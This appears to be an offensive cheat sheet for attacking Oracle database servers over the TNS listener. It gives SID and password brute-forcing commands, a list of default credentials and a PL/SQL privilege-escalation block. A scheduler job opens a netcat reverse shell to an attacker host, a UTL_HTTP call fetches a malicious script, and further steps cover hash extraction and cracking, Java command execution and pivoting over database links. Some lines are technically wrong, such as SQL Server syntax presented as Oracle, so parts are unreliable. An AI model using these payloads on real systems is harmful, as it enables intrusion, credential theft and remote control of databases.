**Oracle Transparent Network Substrate (TNS)** is a protocol used by **Oracle Database servers** for client-server communication. It operates over **TCP port 1521** and can be vulnerable to **SID enumeration, weak authentication, SQL injection, and remote code execution**.
## Common Attack Vectors

- **SID Enumeration** – Identifying valid Oracle database instances.
- **Brute-Force Authentication** – Exploiting weak Oracle accounts (`SYS, SYSTEM, SCOTT`).
- **Exploiting Oracle TNS Listener** – Performing **Denial-of-Service (DoS) attacks** or **MITM traffic manipulation**.
- **SQL Injection for Privilege Escalation** – Exploiting **vulnerable PL/SQL functions**.

**Bookmarks:**
[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)  
## Enumeration
### Check for Open Oracle TNS Port
```bash
nmap -p 1521 --script oracle-tns-version,oracle-sid-brute,oracle-enum-users <target-ip>
```
## Enumerating Oracle SIDs
Oracle databases use **SIDs (System Identifiers)** to differentiate instances. Knowing the **correct SID** is required for authentication.
```bash
odat.py sidguesser -s <target-ip>
odat.py passwordguesser -s <target-ip> -d <SID>
```
https://github.com/quentinhardy/odat

## Connecting to Oracle DB (SQLplus)
```bash
sqlplus username/password@<target-ip>:1521/SID
```
### Common Credentials
```
SYS:oracle
SYSTEM:manager
SCOTT:tiger
HR:hr
DBSNMP:dbsnmp
```
## Exploiting Misconfigurations
If the **TNS Listener** is **unauthenticated**, attackers can:

- **Retrieve database information**
- **Modify database connections**
- **Perform DoS attacks**

Check TNS Listener Status:
```bash
lsnrctl status
```
## PE in Oracle DBs
Check for privilege escalation via PL/SQL injection or privilege misconfigurations once connected:
Check privileges of the current user:
```sql
SELECT * FROM session_privs;
```

Attempt privilege escalation (via SQL Injection in PL/SQL):
```sql
DECLARE
  pragma autonomous_transaction;
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO username';
END;
```

If an account has DBA privileges:
```sql
BEGIN
DBMS_SCHEDULER.CREATE_JOB (
   job_name => 'shell_job',
   job_type => 'EXECUTABLE',
   job_action => '/bin/bash -c "nc -e /bin/bash <attacker-ip> <port>"',
   enabled => TRUE);
END;
/
```

Start an NC listener and get a shell on that BB.
### Exploiting UTL_HTTP for SSRF
```sql
SELECT UTL_HTTP.REQUEST('http://<attacker-ip>/malicious_script.sh') FROM dual;
```

## Password Hash Extraction (Oracle Hashes)
```sql
SELECT name, password FROM sys.user$;
```

```bash
hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Remote Command Execution
If Java is enabled (Oracle JVM), execute OS commands through Oracle DB:
```sql
exec dbms_java.grant_permission('PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
```

Use known Java methods to spawn OS commands for reverse shells or file manipulation.

## Post-Exploitation & Lateral Movement
### Enumerating Privileged Users
```sql
SELECT username, account_status FROM dba_users WHERE account_status='OPEN';
```

### Pivoting via Linked DBs
If **DB links exist**, exploit them to access **remote databases**:
```sql
SELECT * FROM dba_db_links;
```

Execute commands on a linked DB:
```sql
EXEC ('SELECT * FROM users') AT [LINKED_DB];
```